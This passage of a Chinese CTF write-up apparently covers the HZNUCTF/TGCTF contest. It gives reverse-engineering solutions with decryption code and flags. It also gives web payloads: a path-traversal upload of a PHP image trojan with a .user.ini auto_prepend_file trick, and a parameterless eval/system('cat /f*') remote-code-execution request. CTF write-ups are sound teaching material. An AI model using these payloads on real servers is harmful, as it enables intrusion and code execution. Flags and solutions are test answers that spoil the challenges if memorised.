number\">0x000000C7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000015</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000030</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0000008E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x000000FD</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0000008F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0000009E</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x000000AA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000039</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x000000AB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x000000FE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000095</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x000000A7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0000001F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x000000F1</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> Enc<span class=\"token punctuation\">[</span><span class=\"token number\">64</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">64</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n        Enc<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> data<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// 四字节一组翻转</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">64</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">+=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">auto</span> a <span class=\"token operator\">=</span> Enc<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> b <span class=\"token operator\">=</span> Enc<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> c <span class=\"token operator\">=</span> Enc<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> d <span class=\"token operator\">=</span> Enc<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        Enc<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> d<span class=\"token punctuation\">;</span>\n        Enc<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> c<span class=\"token punctuation\">;</span>\n        Enc<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> b<span class=\"token punctuation\">;</span>\n        Enc<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> a<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    \n    <span class=\"token comment\">// DES解密（用后32个key）</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">64</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">+=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span>\n        <span class=\"token function\">des_encrypt</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>Enc <span class=\"token operator\">+</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>key <span class=\"token operator\">+</span> <span class=\"token number\">32</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// 四字节一组翻转</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">64</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">+=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">auto</span> a <span class=\"token operator\">=</span> Enc<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> b <span class=\"token operator\">=</span> Enc<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> c <span class=\"token operator\">=</span> Enc<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> d <span class=\"token operator\">=</span> Enc<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        Enc<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> d<span class=\"token punctuation\">;</span>\n        Enc<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> c<span class=\"token punctuation\">;</span>\n        Enc<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> b<span class=\"token punctuation\">;</span>\n        Enc<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> a<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"HZNUCTF&#123;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// 逆向初始字符串变换</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">64</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">+=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        std<span class=\"token double-colon punctuation\">::</span>string tmp1<span class=\"token punctuation\">;</span>\n        tmp1 <span class=\"token operator\">+=</span> Enc<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        tmp1 <span class=\"token operator\">+=</span> Enc<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n        std<span class=\"token double-colon punctuation\">::</span>string tmp2<span class=\"token punctuation\">;</span>\n        tmp2 <span class=\"token operator\">+=</span> Enc<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        tmp2 <span class=\"token operator\">+=</span> Enc<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%c\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span><span class=\"token punctuation\">(</span>std<span class=\"token double-colon punctuation\">::</span><span class=\"token function\">stoi</span><span class=\"token punctuation\">(</span>tmp1<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%c\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span><span class=\"token punctuation\">(</span>std<span class=\"token double-colon punctuation\">::</span><span class=\"token function\">stoi</span><span class=\"token punctuation\">(</span>tmp2<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&#125;\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>\n\n<p>HZNUCTF{391ds2b9-9e31-45f8-ba4a-4904a2d8}</p>\n<h3 id=\"Index\"><a href=\"#Index\" class=\"headerlink\" title=\"Index\"></a>Index</h3><p>下载附件发现wasm文件开头字节和正常wasm文件不一样，复制修复即可。</p>\n<p>左题目附件，右正常wasm文件。</p>\n<p><img src=\"/images/1744633170178-32.png\" alt=\"img\"></p>\n<p>使用ghidra进行分析，因为有专门的wasm反编译插件。</p>\n<p>通过Exports定位到main函数，以下是经过我重命名后的结果。</p>\n<p><img src=\"/images/1744633170178-33.png\" alt=\"img\"></p>\n<p>首先是输入key，然后判断和该处明文是否相等。</p>\n<p>然后将Key xor上0x51。</p>\n<p><img src=\"/images/1744633170178-34.png\" alt=\"img\"></p>\n<p><img src=\"/images/1744633170178-35.png\" alt=\"img\"></p>\n<p>第一步加密，置了随机数种子0x194，然后用随机数打乱输入的字符串，再转存到另一个Out数组。</p>\n<p><img src=\"/images/1744633170178-36.png\" alt=\"img\"></p>\n<p><img src=\"/images/1744633170179-37.png\" alt=\"img\"></p>\n<p>第二步加密（四个字节一组加密）：</p>\n<ol>\n<li>用key获取到两个值，然后全局数值iRam0001120++，每次加密都+1，初始值是0。</li>\n<li>调用一个函数将0x10ea0处数据异或上0x10da0取下标的对应值。</li>\n<li>再将输入字符串异或上0x10ea0对应下标数据以及0x11020对应下标数据，0x11020处数据就是原Key字符串**”TGCTF404”**。</li>\n</ol>\n<p><img src=\"/images/1744633170179-38.png\" alt=\"img\"></p>\n<p><img src=\"/images/1744633170179-39.png\" alt=\"img\"></p>\n<p>最后再与0x10fa0处数据进行比对，所以0x10fa0处就是加密后的flag。</p>\n<p><img src=\"/images/1744633170179-40.png\" alt=\"img\"></p>\n<p>导出0x10ea0和0x10da0数据，编写以上代码的逆向解密代码即可。</p>\n<p>解密代码：</p>\n<pre class=\"language-Cpp\" data-language=\"Cpp\"><code class=\"language-Cpp\">#include &lt;iostream&gt;\n#include &lt;Windows.h&gt;\n\n&#x2F;&#x2F; 0x10da0处数据\nunsigned char box[] &#x3D; &#123;\n    0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5,\n    0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,\n    0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0,\n    0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,\n    0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc,\n    0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,\n    0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a,\n    0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,\n    0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0,\n    0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,\n    0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b,\n    0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,\n    0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85,\n    0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,\n    0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5,\n    0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,\n    0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17,\n    0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,\n    0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88,\n    0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,\n    0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c,\n    0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,\n    0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9,\n    0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,\n    0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6,\n    0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,\n    0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e,\n    0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,\n    0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94,\n    0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,\n    0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68,\n    0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16&#125;;\n    \n&#x2F;&#x2F; 0x10ea0处数据\nunsigned char box_ori[] &#x3D; &#123;\n    0xd6, 0x90, 0xe9, 0xfe, 0xcc, 0xe1, 0x3d, 0xb7, 0x16, 0xb6, 0x14, 0xc2, 0x28, 0xfb, 0x2c, 0x05,\n    0x2b, 0x67, 0x9a, 0x76, 0x2a, 0xbe, 0x04, 0xc3, 0xaa, 0x44, 0x13, 0x26, 0x49, 0x86, 0x06, 0x99,\n    0x9c, 0x42, 0x50, 0xf4, 0x91, 0xef, 0x98, 0x7a, 0x33, 0x54, 0x0b, 0x43, 0xed, 0xcf, 0xac, 0x62,\n    0xe4, 0xb3, 0x1c, 0xa9, 0xc9, 0x08, 0xe8, 0x95, 0x80, 0xdf, 0x94, 0xfa, 0x75, 0x8f, 0x3f, 0xa6,\n    0x47, 0x07, 0xa7, 0xfc, 0xf3, 0x73, 0x17, 0xba, 0x83, 0x59, 0x3c, 0x19, 0xe6, 0x85, 0x4f, 0xa8,\n    0x68, 0x6b, 0x81, 0xb2, 0x71, 0x64, 0xda, 0x8b, 0xf8, 0xeb, 0x0f, 0x4b, 0x70, 0x56, 0x9d, 0x35,\n    0x1e, 0x24, 0x0e, 0x5e, 0x63, 0x58, 0xd1, 0xa2, 0x25, 0x22, 0x7c, 0x3b, 0x01, 0x21, 0x78, 0x87,\n    0xd4, 0x00, 0x46, 0x57, 0x9f, 0xd3, 0x27, 0x52, 0x4c, 0x36, 0x02, 0xe7, 0xa0, 0xc4, 0xc8, 0x9e,\n    0xea, 0xbf, 0x8a, 0xd2, 0x40, 0xc7, 0x38, 0xb5, 0xa3, 0xf7, 0xf2, 0xce, 0xf9, 0x61, 0x15, 0xa1,\n    0xe0, 0xae, 0x5d, 0xa4, 0x9b, 0x34, 0x1a, 0x55, 0xad, 0x93, 0x32, 0x30, 0xf5, 0x8c, 0xb1, 0xe3,\n    0x1d, 0xf6, 0xe2, 0x2e, 0x82, 0x66, 0xca, 0x60, 0xc0, 0x29, 0x23, 0xab, 0x0d, 0x53, 0x4e, 0x6f,\n    0xd5, 0xdb, 0x37, 0x45, 0xde, 0xfd, 0x8e, 0x2f, 0x03, 0xff, 0x6a, 0x72, 0x6d, 0x6c, 0x5b, 0x51,\n    0x8d, 0x1b, 0xaf, 0x92, 0xbb, 0xdd, 0xbc, 0x7f, 0x11, 0xd9, 0x5c, 0x41, 0x1f, 0x10, 0x5a, 0xd8,\n    0x0a, 0xc1, 0x31, 0x88, 0xa5, 0xcd, 0x7b, 0xbd, 0x2d, 0x74, 0xd0, 0x12, 0xb8, 0xe5, 0xb4, 0xb0,\n    0x89, 0x69, 0x97, 0x4a, 0x0c, 0x96, 0x77, 0x7e, 0x65, 0xb9, 0xf1, 0x09, 0xc5, 0x6e, 0xc6, 0x84,\n    0x18, 0xf0, 0x7d, 0xec, 0x3a, 0xdc, 0x4d, 0x20, 0x79, 0xee, 0x5f, 0x3e, 0xd7, 0xcb, 0x39, 0x48&#125;;\n    \nvoid unnamed_function_10(byte *param1, int param2)\n&#123;\n    for (int i &#x3D; 0; i &lt; 0x100; i &#x3D; i + 1)\n    &#123;\n        param1[i] &#x3D; param1[i] ^ (byte)param2;\n    &#125;\n    return;\n&#125;\n\nunsigned char Enc[] &#x3D; &#123;\n    0x84, 0x00, 0x00, 0x00,\n    0x1c, 0x00, 0x00, 0x00,\n    0x6b, 0x00, 0x00, 0x00,\n    0xf7, 0x00, 0x00, 0x00,\n    0x49, 0x00, 0x00, 0x00,\n    0x22, 0x00, 0x00, 0x00,\n    0xd6, 0x00, 0x00, 0x00,\n    0x42, 0x00, 0x00, 0x00,\n    0x50, 0x00, 0x00, 0x00,\n    0x7b, 0x00, 0x00, 0x00,\n    0x42, 0x00, 0x00, 0x00,\n    0xf4, 0x00, 0x00, 0x00,\n    0x46, 0x00, 0x00, 0x00,\n    0xa9, 0x00, 0x00, 0x00,\n    0x83, 0x00, 0x00, 0x00,\n    0x62, 0x00, 0x00, 0x00,\n    0xd1, 0x00, 0x00, 0x00,\n    0x32, 0x00, 0x00, 0x00,\n    0x80, 0x00, 0x00, 0x00,\n    0x42, 0x00, 0x00, 0x00,\n    0x6a, 0x00, 0x00, 0x00,\n    0x10, 0x00, 0x00, 0x00,\n    0xa3, 0x00, 0x00, 0x00,\n    0xf2, 0x00, 0x00, 0x00,\n    0xe2, 0x00, 0x00, 0x00,\n    0xb8, 0x00, 0x00, 0x00,\n    0x0b, 0x00, 0x00, 0x00,\n    0x76, 0x00, 0x00, 0x00,\n    0xb0, 0x00, 0x00, 0x00,\n    0xdc, 0x00, 0x00, 0x00,\n    0x02, 0x00, 0x00, 0x00,\n    0x51, 0x00, 0x00, 0x00&#125;;\n\nvoid Dec_2(unsigned char *Input, unsigned char *Key)\n&#123;\n    static int c &#x3D; 0;\n    int iVar1 &#x3D; (int)Key[c] &gt;&gt; 4;\n    DWORD uVar2 &#x3D; (int)Key[c] &amp; 0xf;\n    c++;\n    unnamed_function_10(box_ori, (int)*(char *)(iVar1 * 0x10 + (unsigned char *)box + uVar2));\n    unsigned char key_o[] &#x3D; &quot;TGCTF404&quot;;\n    for (int i &#x3D; 0; i &lt; 4; i++)\n    &#123;\n        Input[i] &#x3D; Input[i] ^ box_ori2[iVar1 * 0x10 + i * 0x11 + uVar2];\n        Input[i] &#x3D; Input[i] ^ key_o[i];\n    &#125;\n&#125;\n\nvoid decrypt(unsigned char *Input, int length)\n&#123;\n    unsigned char Key[] &#x3D; &quot;TGCTF404&quot;;\n\n    for (int i &#x3D; 0; i &lt; 8; i++)\n        Key[i] ^&#x3D; 0x51;\n\n    for (int i &#x3D; 0; i &lt; length; i +&#x3D; 4)\n    &#123;\n        Dec_2((unsigned char *)(Input + i), Key);\n    &#125;\n\n    srand(0x194);\n\n    int swaps[32][2];\n    for (int i &#x3D; 0; i &lt; 32; i++)\n    &#123;\n        auto Value &#x3D; rand();\n        Value &#x3D; i + Value &#x2F; (0x7fff &#x2F; (32 - i) + 1);\n        swaps[i][0] &#x3D; i;\n        swaps[i][1] &#x3D; Value;\n    &#125;\n\n    for (int i &#x3D; 31; i &gt;&#x3D; 0; i--)\n    &#123;\n        unsigned char temp &#x3D; Input[swaps[i][0]];\n        Input[swaps[i][0]] &#x3D; Input[swaps[i][1]];\n        Input[swaps[i][1]] &#x3D; temp;\n    &#125;\n&#125;\n\nint main()\n&#123;\n    unsigned char Key[] &#x3D; &quot;TGCTF404&quot;;\n    unsigned char Enc_flag[32]&#123;&#125;;\n    \n    for (int i &#x3D; 0; i &lt; 32; i++)\n        Enc_flag[i] &#x3D; *(int *)((byte *)Enc + i * 4);\n\n    decrypt(Enc_flag, 32);\n\n    printf(&quot;%.32s\\n&quot;, Enc_flag);\n    return 0;\n&#125;</code></pre>\n\n<p>HZNUCTF{f898-de85-46e-9e43-b9c8}</p>\n<h2 id=\"Web\"><a href=\"#Web\" class=\"headerlink\" title=\"Web\"></a>Web</h2><h3 id=\"ez-upload\"><a href=\"#ez-upload\" class=\"headerlink\" title=\"(ez)upload\"></a>(ez)upload</h3><p>扫目录 有 upload.php.bak 翻源码。name处存在穿越。</p>\n<p>可以上传.user.ini。而只有上级目录有php文件可以触发。</p>\n<p>因此。我们传图片马和.user.ini到上级目录。等待触发即可。</p>\n<p>payload：</p>\n<pre class=\"language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token request-line\"><span class=\"token method property\">POST</span> <span class=\"token request-target url\">/upload.php?name=../evil.png</span> <span class=\"token http-version property\">HTTP/1.1</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Host</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">node1.tgctf.woooo.tech:32690</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Content-Length</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">320</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Cache-Control</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">max-age=0</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Accept-Language</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">zh-CN,zh;q=0.9</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Origin</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">http://node1.tgctf.woooo.tech:32690</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Content-Type</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">multipart/form-data; boundary=----WebKitFormBoundary76S3hC5Gh3B7j6KZ</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Upgrade-Insecure-Requests</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">1</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">User-Agent</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Accept</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Referer</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">http://node1.tgctf.woooo.tech:32690/</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Accept-Encoding</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">gzip, deflate, br</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Connection</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">keep-alive</span></span>\n\n------WebKitFormBoundary76S3hC5Gh3B7j6KZ\n<span class=\"token header\"><span class=\"token header-name keyword\">Content-Disposition</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">form-data; name=\"name\"; filename=\"1.png\"</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Content-Type</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">application/octet-stream</span></span>\n\n&lt;?php phpinfo();?>\n\n\n------WebKitFormBoundary76S3hC5Gh3B7j6KZ\n<span class=\"token header\"><span class=\"token header-name keyword\">Content-Disposition</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">form-data; name=\"submit\"</span></span>\n\n上传文件\n------WebKitFormBoundary76S3hC5Gh3B7j6KZ--\n<span class=\"token request-line\"><span class=\"token method property\">POST</span> <span class=\"token request-target url\">/upload.php?name=../.user.ini</span> <span class=\"token http-version property\">HTTP/1.1</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Host</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">node1.tgctf.woooo.tech:32690</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Content-Length</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">335</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Cache-Control</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">max-age=0</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Accept-Language</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">zh-CN,zh;q=0.9</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Origin</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">http://node1.tgctf.woooo.tech:32690</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Content-Type</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">multipart/form-data; boundary=----WebKitFormBoundary76S3hC5Gh3B7j6KZ</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Upgrade-Insecure-Requests</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">1</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">User-Agent</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Accept</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Referer</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">http://node1.tgctf.woooo.tech:32690/</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Accept-Encoding</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">gzip, deflate, br</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Connection</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">keep-alive</span></span>\n\n------WebKitFormBoundary76S3hC5Gh3B7j6KZ\n<span class=\"token header\"><span class=\"token header-name keyword\">Content-Disposition</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">form-data; name=\"name\"; filename=\".user.ini\"</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Content-Type</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">application/octet-stream</span></span>\n\nauto_prepend_file=evil.png\n\n------WebKitFormBoundary76S3hC5Gh3B7j6KZ\n<span class=\"token header\"><span class=\"token header-name keyword\">Content-Disposition</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">form-data; name=\"submit\"</span></span>\n\n上传文件\n------WebKitFormBoundary76S3hC5Gh3B7j6KZ--</code></pre>\n\n<p>在phpinfo的$_SERVER[‘FLAG’]里看到flag</p>\n<h3 id=\"AAA偷渡阴平\"><a href=\"#AAA偷渡阴平\" class=\"headerlink\" title=\"AAA偷渡阴平\"></a>AAA偷渡阴平</h3><p>无参数RCE绕过。</p>\n<p>payload：</p>\n<pre class=\"language-http\" data-language=\"http\"><code class=\"language-http\">GET /?tgctf2025=eval(end(current(get_defined_vars())));&amp;b=system('cat /f*'); HTTP/1.1\n<span class=\"token header\"><span class=\"token header-name keyword\">Host</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">node1.tgctf.woooo.tech:30815</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Accept-Language</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">zh-CN,zh;q=0.9</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Upgrade-Insecure-Requests</span><span class=\"token punctuation\">:</span> <span 